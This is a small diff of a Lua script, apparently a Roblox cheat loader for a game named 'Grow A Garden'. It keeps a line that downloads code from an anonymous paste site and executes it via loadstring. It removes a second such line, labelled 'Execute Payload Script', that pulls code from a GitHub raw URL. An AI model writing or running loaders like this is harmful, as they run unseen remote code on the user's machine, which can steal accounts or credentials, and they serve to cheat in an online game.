@@ -9,7 +9,3 @@ local CoreGui = game:GetService("CoreGui")
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/FPhGUAhJ/raw"))()
 end)
-
--- Execute Payload Script
-_G.Settings = {}
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Nicuse101/CustomScripts/refs/heads/master/GrowAGarden', true))()
